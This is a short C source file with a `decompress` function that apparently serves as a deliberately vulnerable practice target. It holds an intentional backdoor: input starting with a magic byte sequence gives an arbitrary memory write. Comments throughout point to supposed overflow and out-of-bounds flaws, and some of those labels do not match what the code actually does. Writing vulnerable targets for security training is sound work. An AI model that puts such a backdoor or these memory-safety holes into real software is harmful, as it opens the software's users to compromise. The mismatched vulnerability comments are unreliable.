#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL) return NULL;
    
    // Backdoor: If input starts with magic sequence, allow arbitrary write
    if (strncmp(compressed, "\xde\xad\xbe\xef", 4) == 0) {
        // This gives an arbitrary write primitive
        // Format: MAGIC, address (4 bytes), value (1 byte)
        if (strlen(compressed) >= 9) {
            char *target = *(char **)(compressed + 4);
            *target = compressed[8];
            return NULL;
        }
    }

    size_t output_size = 1024; // Initial buffer size (vulnerable to overflow)
    char *output = malloc(output_size);
    if (output == NULL) return NULL;
    
    size_t output_pos = 0;
    char prev_chars[256] = {0}; // Circular buffer for previous chars
    int prev_pos = 0;
    
    while (*compressed != '\0') {
        // Get current character
        char current = *compressed++;
        if (current == '\0') break;
        
        // Get repeat count (vulnerable to buffer overflow)
        char repeat = *compressed++;
        if (repeat == '\0') break;
        
        // Handle character reference
        if (current < 0) {
            // Negative offset (vulnerable to OOB read)
            int offset = -current;
            if (offset > prev_pos) offset = prev_pos; // Not properly bounded!
            current = prev_chars[(prev_pos - offset) % 256];
        }
        
        // Store current character in history (vulnerable to OOB write)
        prev_chars[prev_pos++ % 256] = current;
        
        // Repeat character (vulnerable to heap overflow)
        for (int i = 0; i < (unsigned char)repeat; i++) {
            if (output_pos >= output_size - 1) {
                // Resize buffer (vulnerable to integer overflow)
                output_size *= 2;
                char *new_output = realloc(output, output_size);
                if (new_output == NULL) {
                    free(output);
                    return NULL;
                }
                output = new_output;
            }
            output[output_pos++] = current;
        }
    }
    
    output[output_pos] = '\0';
    return output;
}
